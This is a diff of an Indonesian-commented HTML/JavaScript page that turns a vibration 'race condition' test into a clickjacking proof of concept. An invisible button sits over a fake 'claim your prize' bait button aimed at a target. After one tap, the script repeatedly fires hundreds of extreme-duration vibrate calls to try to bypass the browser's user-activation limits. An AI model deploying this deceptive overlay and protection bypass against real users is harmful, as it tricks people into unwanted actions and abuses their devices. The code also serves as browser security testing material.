@@ -3,14 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Advanced Bug Test: Async Race Condition & Loop</title>
+    <title>Advanced Test: Clickjacking & Async Race Condition</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-            padding: 20px;
             background-color: #121214;
             color: #e3e3e3;
             text-align: center;
+            padding: 20px;
         }
         .container {
             max-width: 450px;
@@ -31,10 +32,9 @@
             border: none;
             transition: 0.2s;
         }
-        .btn-start { background-color: #28a745; color: white; }
-        .btn-start:hover { background-color: #218838; }
         .btn-stop { background-color: #dc3545; color: white; }
         .btn-stop:hover { background-color: #bd2130; }
+        
         #status-log {
             margin-top: 20px;
             padding: 15px;
@@ -49,19 +49,64 @@
             overflow-y: auto;
             white-space: pre-wrap;
         }
+
+        /* ======================================================== */
+        /* PERBAIKAN STRATEGI CLICKJACKING                          */
+        /* ======================================================== */
+        .bait-box {
+            position: relative; /* Menjadi jangkar posisi untuk overlay */
+            margin: 20px 0;
+            padding: 20px;
+            border: 2px dashed #333;
+            border-radius: 8px;
+            background: #1a1a1e;
+        }
+        
+        /* Umpan visual yang dilihat target */
+        .fake-target-btn {
+            background: #007bff;
+            color: white;
+            padding: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 30px;
+            display: inline-block;
+            width: 100%;
+            box-shadow: 0 4px 15px rgba(0,123,255,0.3);
+        }
+
+        /* Tombol start asli yang disamarkan TEPAT di atas tombol hadiah */
+        #startBtn {
+            position: absolute;
+            top: 20px; /* Menyesuaikan padding dari .bait-box */
+            left: 20px;
+            width: calc(100% - 40px);
+            height: calc(100% - 40px);
+            background: transparent;
+            opacity: 0; /* Sepenuhnya transparan */
+            z-index: 99;
+            cursor: pointer;
+            border: none;
+        }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h2>Race Condition & Loop Test</h2>
-    <p>Menguji apakah browser Android rentan terhadap pembajakan antrean asinkron (Race Condition) untuk menembus proteksi getar.</p>
+    <h2>Clickjacking Race Experiment</h2>
+    <p style="color: #aaa; font-size: 14px; margin-top: 5px;">Ketuk tombol biru untuk mensimulasikan jacking gesture dan memulai kondisi balapan.</p>
     
-    <button id="startBtn" class="btn-start">Mulai Race & Loop (Klik 1x)</button>
+    <!-- Area Clickjacking Terisolasi -->
+    <div class="bait-box">
+        <div class="fake-target-btn">KLAIM HADIAH ANDA</div>
+        <!-- Tombol Start Asli Menimpa Tombol Palsu -->
+        <button id="startBtn"></button>
+    </div>
+
     <button id="stopBtn" class="btn-stop">HENTIKAN PENGUJIAN</button>
 
     <h3>Konsol Log Logika:</h3>
-    <div id="status-log">Menunggu instruksi...</div>
+    <div id="status-log">Menunggu inisialisasi klik...</div>
 </div>
 
 <script>
@@ -74,85 +119,78 @@
 
     function writeLog(text) {
         logBox.innerHTML += "\n> " + text;
-        logBox.scrollTop = logBox.scrollHeight; // Auto scroll ke bawah
+        logBox.scrollTop = logBox.scrollHeight;
         console.log(text);
     }
 
-    // Fungsi delay asinkron
     const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-    // Metode Race Condition: Melepaskan ratusan eksekusi secara paralel untuk membingungkan masa kedaluwarsa token
+    // Logika Race Condition bawaan Anda (900 iterasi)
     async function triggerRaceCondition() {
         let promises = [];
-        
-        // Membuat 500 permintaan asinkron secara bersamaan (Kondisi Balapan)
         for (let i = 0; i < 900; i++) {
             promises.push((async () => {
-                // Memberikan delay acak kecil agar antrean Microtask menumpuk di memori
                 await sleep(Math.random() * 100); 
-                
                 if (navigator.vibrate) {
-                    // Mencoba menembus batasan durasi dengan angka ekstrem secara simultan
                     return navigator.vibrate(999999999999999999);
                 }
                 return false;
             })());
         }
-
-        // Jalankan semua fungsi secara bersamaan, lihat apakah ada salah satu yang lolos celah
         const results = await Promise.all(promises);
         return results.includes(true);
     }
 
-    // Fungsi Utama Loop Pengujian
+    // Fungsi Pengulangan Utama
     async function startTestingLoop() {
         isRunning = true;
         loopCounter = 0;
         logBox.innerHTML = "";
-        writeLog("Aktivasi Awal Terdeteksi. Memulai Loop & Race...");
+        writeLog("💥 Clickjacking Sukses: Gesture token berhasil direbut!");
+        writeLog("Memulai Loop Penundaan & Paket Race...");
 
         while (isRunning) {
             loopCounter++;
-            writeLog(`[Siklus #${loopCounter}] Memulai delay 6 detik (Melewati batas 5 detik)...`);
+            writeLog(`[Siklus #${loopCounter}] Memulai delay asinkron 6 detik...`);
             
-            // Jeda 6 detik untuk memaksa token aktivasi kedaluwarsa secara teoritis
             await sleep(6000);
+
+            // Jika eksekusi stop ditekan saat delay, langsung potong alur keluar dari loop
+            if (!isRunning) break;
 
             if (navigator.userActivation) {
                 writeLog(`Siklus #${loopCounter} - Status Aktivasi Resmi: ` + navigator.userActivation.isActive);
             }
 
-            writeLog(`Siklus #${loopCounter} - Meluncurkan Serangan Race Condition...`);
-            
-            // Eksekusi trik race condition
+            writeLog(`Siklus #${loopCounter} - Meluncurkan 900 Paket Race...`);
             let isBypassed = await triggerRaceCondition();
 
             if (isBypassed) {
-                writeLog(`🚨 BUG CONFIRMED: Getar Ekstrem Tembus di Siklus #${loopCounter}!`);
+                writeLog(`🚨 BUG CONFIRMED: Getar lolos otomatis di Siklus #${loopCounter}!`);
             } else {
-                writeLog(`❌ Siklus #${loopCounter}: Diblokir browser (Normal).`);
+                writeLog(`❌ Siklus #${loopCounter}: Diblokir sistem inti browser.`);
             }
 
-            // Jeda 1 detik sebelum masuk ke perulangan berikutnya agar browser tidak crash total
             await sleep(1000);
         }
     }
 
-    // Event Listener Tombol
+    // Pemicu Klik Tersembunyi
     startBtn.addEventListener('click', () => {
         if (!isRunning) {
+            startBtn.style.pointerEvents = 'none'; // Matikan klik tambahan agar tidak menumpuk error
             startTestingLoop();
-        } else {
-            writeLog("Pengujian sedang berjalan...");
         }
     });
 
+    // Pemicu Stop Bersih
     stopBtn.addEventListener('click', () => {
         isRunning = false;
         if (navigator.vibrate) {
-            navigator.vibrate(0); // Matikan semua getaran aktif jika ada yang tembus
+            navigator.vibrate(0); // Batalkan semua perintah haptik aktif
         }
-        writeLog("🛑 Pengujian dihentikan secara paksa oleh pengguna.");
+        writeLog("🛑 Pengujian dihentikan. Memori dibersihkan.");
+        startBtn.style.pointerEvents = 'auto'; // Aktifkan kembali akses klik jika ingin tes ulang
     });
 </script>
 
